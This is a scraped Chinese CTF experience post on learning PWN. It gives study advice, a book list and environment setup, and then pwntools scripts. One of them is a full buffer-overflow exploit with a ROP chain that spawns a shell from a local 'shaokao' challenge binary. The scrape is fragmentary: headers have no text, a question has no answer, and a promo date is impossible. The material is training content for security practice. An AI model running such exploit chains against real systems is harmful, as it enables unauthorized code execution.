# CTF经验贴｜我们对PWN都有哪些误会

> 原文: https://www.ctfiot.com/132826.html
> ID: 132826

一

前言

个人感觉最大的难点在于“能否耐得住寂寞”，因为很难说一个人会对这个东西长期持续地抱有很高的热情，大概是有那样的人，并且那样的人都成大神了，但我这种普通人说实话不太做得到……兴趣肯定还是有的，但很难说还会比当年刚入坑时候要高了。

个人认为现在学pwn已经没有什么系不系统的问题了，随便一搜资料，跟着大师傅们做做，入了这个门槛，然后从此以后基本上自己就能知道要做什么了。但难点在于，现在是2022年，前人搞过的东西已经被修缮的非常好了，但你还是要从前人的路开始走，因此很可能会有一段很长的时间是“什么都做不了”的状态，比赛也是爆零，挖洞也什么都不知道，像是浑浑噩噩就这么晃悠过去一两年之类的，然后就渐渐没有了当年的兴致，觉得这条路太过艰难了（我自己就是这种菜鸡，有很长一段时间因为和现在的赛题考点脱节以至于比赛一题都做不出来…），然后再看看同级的师傅们去搞钱，一两天就赚的比自己实习一个月还高，眼一红心一横就转 web 去了，然后靠着二进制基础比别人多拿一点……

二

How to do

提问的智慧

搜索引擎的使用

C 语言

汇编语言

IDA/gdb 的使用

Python 脚本的编写

x86_64 架构下程序运行原理

ctf-wiki

ubuntu:16.04 / glibc-2.23

ubuntu:18.04 / glibc-2.28

ubuntu:20.04 / glibc-2.31

ubuntu:22.04 / glibc-2.34

操作系统(B)：《操作系统真象还原》《鸟哥的Linux私房菜》

计算机原理(B)：《深入理解计算机系统(CSAPP)》，《程序员的自我修养》

C/C++ (A)：《C Primer plus》《C++ Primer plus》

汇编语言(A)：《汇编语言》- 王爽

数据结构(C-)：《数据结构与算法分析 —— C语言描述》

网络协议(C)：《TCP/IP 详解 (卷一)》

逆向工程(D)：《逆向工程核心原理》

编译原理(D)：《编译原理(龙书)》

CTF-wiki : https://ctf-wiki.org/pwn/linux/user-mode/environment/

BUUOJ：https://buuoj.cn/

三

实践经验

Q1:理论与现实的差距在哪？

往期精选

安恒培训｜CCRC-DSO数据安全官认证课程来袭～火热招生报名中

2023-08-03

助推数字安全教育发展，安恒信息持续开展高质量人才培养服务

2023-07-27

开创新认证模式！安恒信息助力方班教学资源实践能力认证

2023-07-62


```
FROM ubuntu:16.04

RUN sed -i "s/http://archive.ubuntu.com/http://mirrors.tuna.tsinghua.edu.cn/g" /etc/apt/sources.list && 
    apt-get update && apt-get -y dist-upgrade && 
    apt-get install -y lib32z1 xinetd

RUN useradd -m ctf

WORKDIR /home/ctf
# 以下省略
```



```
docker cp imageid:/lib32/libc.so.6 本地路径
```



```
from pwn import *
from struct import pack
p=process("./shaokao")
gdb.attach(p,"b*0x401FAE")
pause()
p.recvuntil("0. ")
p.sendline(str(1))
p.recvuntil("3. ")
p.sendline("1")
p.recvuntil("n")
p.sendline("-999998")

p.interactive()
```



```
ROPgadget --binary shaokao --ropchain
```



```
from pwn import *
from struct import pack
p=process("./shaokao")
#gdb.attach(p,"b*0x401FAE")
#pause()
p.recvuntil("0. ")
p.sendline(str(1))
p.recvuntil("3. ")
p.sendline("1")
p.recvuntil("n")
p.sendline("-999998")
p.recvuntil("0. ")
p.sendline(str(4))

p.recvuntil("0. ")
p.sendline(str(5))

def rop():
 p = ''
 p += pack('<Q', 0x000000000040a67e) # pop rsi ; ret
 p += pack('<Q', 0x00000000004e60e0) # @ .data
 p += pack('<Q', 0x0000000000458827) # pop rax ; ret
 p += '/bin//sh'
 p += pack('<Q', 0x000000000045af95) # mov qword ptr [rsi], rax ; ret
 p += pack('<Q', 0x000000000040a67e) # pop rsi ; ret
 p += pack('<Q', 0x00000000004e60e8) # @ .data + 8
 p += pack('<Q', 0x0000000000447339) # xor rax, rax ; ret
 p += pack('<Q', 0x000000000045af95) # mov qword ptr [rsi], rax ; ret
 p += pack('<Q', 0x000000000040264f) # pop rdi ; ret
 p += pack('<Q', 0x00000000004e60e0) # @ .data
 p += pack('<Q', 0x000000000040a67e) # pop rsi ; ret
 p += pack('<Q', 0x00000000004e60e8) # @ .data + 8
 p += pack('<Q', 0x00000000004a404b) # pop rdx ; pop rbx ; ret
 p += pack('<Q', 0x00000000004e60e8) # @ .data + 8
 p += pack('<Q', 0x4141414141414141) # padding
 p += pack('<Q', 0x0000000000447339) # xor rax, rax ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
 p += pack('<Q', 0x00000000004230a6) # syscall ; re
 return p

payload=b"a"*32+b"b"*8+rop()
p.sendline(payload)

p.interactive()
```



```
from pwn import * 
context.log_level='debug' 
context.arch='amd64' 
p=process('./your_binary')

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b) 
sa = lambda a,b: p.sendafter(a,b) 
sl = lambda a: p.sendline(a) 
s = lambda a: p.send(a) 

p.interactive()
```



```
.text
.global _funcA, _sum

_funcA:
    stp x29, x30, [sp, #-0x10]!
    bl _sum
    ldp x29, x30, [sp], #0x10
    ret

_sum:
    add x0, x0, x1
    ret
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/8-1693404658.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/6-1693404659.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/9-1693404660.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/6-1693404661.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/1-1693404662.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/3-1693404662.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/7-1693404663.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/1-1693404665.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/9-1693404667.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/7-1693404668.png)